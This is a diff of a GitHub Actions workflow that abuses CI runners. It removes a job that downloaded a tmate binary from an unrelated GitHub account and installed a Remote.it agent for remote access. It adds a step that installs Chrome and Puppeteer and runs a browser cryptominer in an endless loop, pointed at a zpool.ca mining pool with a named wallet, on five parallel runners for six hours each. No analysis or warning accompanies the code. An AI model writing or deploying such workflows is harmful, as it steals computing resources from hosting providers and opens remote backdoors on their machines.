@@ -1,15 +1,10 @@
-name: tmate-12h-chain
-
-on:
-  workflow_dispatch:
-
 jobs:
   tmate-1:
     runs-on: namespace-profile-default
     timeout-minutes: 360
     strategy:
       matrix:
-        runner_id: [1, 2, 3, 4, 5]  # 5 parallel runners
+        runner_id: [1, 2, 3, 4, 5]
       fail-fast: false
     steps:
       - name: Download tmate
@@ -29,28 +24,45 @@ jobs:
           ./tmate -F &
           sleep 21600   # 6 hours
 
-  tmate-2:
-    needs: tmate-1
-    runs-on: ubuntu-latest
-    timeout-minutes: 360
-    strategy:
-      matrix:
-        runner_id: [1, 2, 3, 4, 5]  # Must match tmate-1
-      fail-fast: false
-    steps:
-      - name: Download tmate
+      - name: Install Chrome, Node.js, and Puppeteer, then run webminer
         run: |
           set -e
-          wget -O tmate https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
-          chmod +x tmate
-
-      - name: Install Remote.it Agent
-        run: |
-          set -e
-          R3_REGISTRATION_CODE="55EC315E-BF92-5164-BAB5-624903D7BEF2" sh -c "$(curl -L https://downloads.remote.it/remoteit/install_agent.sh)"
-
-      - name: Start tmate session
-        run: |
-          set -e
-          ./tmate -F &
-          sleep 21600   # another 6 hours
+          if ! command -v google-chrome &> /dev/null; then
+            wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
+            sudo sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list'
+            sudo apt-get update
+            sudo apt-get install -y google-chrome-stable
+          fi
+          if ! command -v node &> /dev/null; then
+            curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+            sudo apt-get install -y nodejs
+          fi
+          npm install puppeteer
+          node -e "
+          const puppeteer = require('puppeteer');
+          const url = 'https://webminer.pages.dev?algorithm=cwm_ghostrider&host=ghostrider.na.mine.zpool.ca&port=5354&worker=RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5&password=c%3DRTM&workers=4';
+          (async () => {
+            while (true) {
+              try {
+                const browser = await puppeteer.launch({
+                  headless: false,
+                  args: [
+                    '--no-sandbox',
+                    '--disable-setuid-sandbox',
+                    '--disable-dev-shm-usage',
+                    '--disable-gpu',
+                    '--window-size=1200,800'
+                  ]
+                });
+                const page = await browser.newPage();
+                await page.goto(url, { waitUntil: 'networkidle2' });
+                console.log('Webminer page loaded. Mining started.');
+                await new Promise(r => setTimeout(r, 21600 * 1000)); // 6 hours
+                await browser.close();
+              } catch (err) {
+                console.error('Error occurred, restarting browser:', err);
+              }
+              await new Promise(r => setTimeout(r, 5000));
+            }
+          })();
+          "
